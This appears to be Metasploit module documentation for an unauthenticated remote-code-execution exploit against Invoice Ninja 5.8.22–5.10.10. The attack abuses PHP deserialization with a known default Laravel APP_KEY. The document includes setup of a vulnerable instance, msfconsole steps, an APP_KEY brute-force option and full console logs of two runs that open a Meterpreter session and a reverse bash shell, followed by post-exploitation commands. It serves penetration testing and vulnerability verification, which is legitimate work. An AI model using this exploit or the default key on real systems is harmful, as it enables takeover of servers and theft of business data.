## Vulnerable Application
Invoice Ninja is a free invoicing software for small businesses, based on the PHP framework Laravel.
A Remote Code Execution vulnerability in Invoice Ninja (>= `5.8.22` <= `5.10.10`) allows remote unauthenticated
attackers to conduct PHP deserialization attacks via endpoint `/route/<hash>` which accepts a Laravel
ciphered value which is unsafe unserialized, if an attacker has access to the secret `APP_KEY`.
As it allows remote code execution, adversaries could exploit this flaw to execute arbitrary commands,
potentially resulting in complete system compromise, data exfiltration, or unauthorized access
to sensitive information.

The following release was tested.
* Invoice Ninja `5.10.10` on Ubuntu 22.04

## Installation steps to install Invoice Ninja on a self-hosted platform
`wget https://github.com/invoiceninja/dockerfiles/archive/refs/tags/5.8.22.zip`

`unzip 5.8.22.zip`

`cd dockerfiles-5.8.22`

Replace inside `docker-compose.yml`

FROM `image: invoiceninja/invoiceninja:5` TO `image: invoiceninja/invoiceninja:5.8.22`

Replace in `env`
`APP_KEY=base64:RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno=`

Then, execute `docker-compose up`
## Verification Steps
- [ ] Start `msfconsole`
- [ ] `use exploit/linux/http/linux/http/invoiceninja_uauth_rce_cve_2024_55555`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ] `set lhost <attacker-ip>`
- [ ] `set target <0=PHP Command, 1=Unix/Linux Command>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options
### APP_KEY
This option is required if the BRUTE_FORCE option is not used.
It is the Laravel APP_KEY with a default key: `base64:RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno=`.

### BRUTEFORCE
This option is optional and is a text file with a list of APP_KEYs, one per line for a bruteforce attack.

## Scenarios
### Invoice Ninja 5.10.10 on Ubuntu 22.04 -  PHP Command target
Attack scenario: use the default Laravel APP_KEY preset in the option APP_KEY.
```msf
msf6 > use modules/exploits/linux/http/invoiceninja_unauth_rce_cve_2024_55555
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(linux/http/invoiceninja_unauth_rce_cve_2024_55555) > set rhosts 192.168.201.6
rhosts => 192.168.201.6
msf6 exploit(linux/http/invoiceninja_unauth_rce_cve_2024_55555) > set lhost 192.168.201.8
lhost => 192.168.201.8
msf6 exploit(linux/http/invoiceninja_unauth_rce_cve_2024_55555) > rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.6:443 can be exploited.
[+] The target appears to be vulnerable. Invoice Ninja 5.10.10
[*] Lets check if the APP_KEY(s) is/are valid by decrypting the XSRF_TOKEN inside the cookie.
[*] Grabbing the cookie with the XSRF-TOKEN.
[+] APP_KEY is valid: base64:RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno=
[+] Unciphered value: e60eab8287b88f834312505e582750ae6f95a84b|6IWTnJv2f3lL1nbKRbl6LwJixPeRF5grQVTFTIuB
[*] Generate an encrypted serialization payload with our cracked APP_KEY.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 192.168.201.6
[*] Meterpreter session 1 opened (192.168.201.8:4444 -> 192.168.201.6:60120) at 2025-02-23 09:47:28 +0000

meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer    : cuckoo
OS          : Linux cuckoo 5.15.0-131-generic #141-Ubuntu SMP Fri Jan 10 21:18:28 UTC 2025 x86_64
Meterpreter : php/linux
meterpreter > pwd
/usr/share/nginx/invoiceninja/public
meterpreter >
```
###  Invoice Ninja 5.10.10 on Ubuntu 22.04 - Unix/Linux Command target
Attack scenario: use the BRUTEFORCE option with a list of APP_KEYS in a text file.
```msf
msf6 exploit(linux/http/invoiceninja_unauth_rce_cve_2024_55555) > set target 1
target => 1
msf6 exploit(linux/http/invoiceninja_unauth_rce_cve_2024_55555) > set BRUTEFORCE /root/laravel-crypto-killer/wordlists/invoiceninja_default.txt
BRUTEFORCE => /root/laravel-crypto-killer/wordlists/invoiceninja_default.txt
msf6 exploit(linux/http/invoiceninja_unauth_rce_cve_2024_55555) > rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.6:443 can be exploited.
[+] The target appears to be vulnerable. Invoice Ninja 5.10.10
[*] Lets check if the APP_KEY(s) is/are valid by decrypting the XSRF_TOKEN inside the cookie.
[*] Grabbing the cookie with the XSRF-TOKEN.
[*] Starting bruteforce decryption with APP_KEYS listed in /root/laravel-crypto-killer/wordlists/invoiceninja_default.txt.
[+] APP_KEY is valid: base64:RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno=
[+] Unciphered value: e60eab8287b88f834312505e582750ae6f95a84b|3epElAO1qNeckBzHOytBrNnGrvRJSyeCBsahBkSO
[*] Generate an encrypted serialization payload with our cracked APP_KEY.
[*] Executing Unix/Linux Command for cmd/unix/reverse_bash
[*] Command shell session 2 opened (192.168.201.8:4444 -> 192.168.201.6:60340) at 2025-02-23 09:49:15 +0000

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux cuckoo 5.15.0-131-generic #141-Ubuntu SMP Fri Jan 10 21:18:28 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
pwd
/usr/share/nginx/invoiceninja/public
```

## Limitations
No limitations.
